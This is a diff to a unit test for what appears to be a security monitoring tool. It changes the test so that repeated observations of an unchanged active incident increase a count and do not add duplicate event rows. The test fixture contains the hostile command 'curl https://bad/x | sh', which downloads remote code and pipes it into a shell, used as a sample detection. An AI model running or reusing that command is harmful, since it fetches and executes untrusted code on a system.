@@ -3795,13 +3795,21 @@ class TestEventIncidentCore(Sandbox):
         self.assertTrue({"events", "signals", "incidents", "sensor_status"}
                         <= tables)
 
-    def test_each_observation_is_an_event_but_signal_upserts(self):
+    def test_a_still_true_observation_folds_into_its_count(self):
+        """DELIBERATE contract change (was: each observation is an event).
+        A re-observation of an unchanged fact whose own case is already an
+        active incident folds into signals.occurrence_count instead of
+        minting a byte-identical event row — the old behaviour accumulated
+        41-64 duplicate rows per standing incident and burned the retention
+        budget. The full boundary (severity change / routing verdict /
+        risk-kind incidents all still record) is pinned in
+        test_persisting_condition.py."""
         f = aegis.finding("HIGH", "behavior", "Fileless fetch execute",
                           "curl https://bad/x | sh", "behavior:fetch:1",
                           markers=["fileless-fetch-exec"])
         aegis.record_security_state([f], now=1_700_000_000)
         aegis.record_security_state([f], now=1_700_000_010)
-        self.assertEqual(self._rows("SELECT count(*) FROM events")[0][0], 2)
+        self.assertEqual(self._rows("SELECT count(*) FROM events")[0][0], 1)
         self.assertEqual(self._rows("SELECT count(*) FROM signals")[0][0], 1)
         self.assertEqual(self._rows(
             "SELECT occurrence_count FROM signals")[0][0], 2)
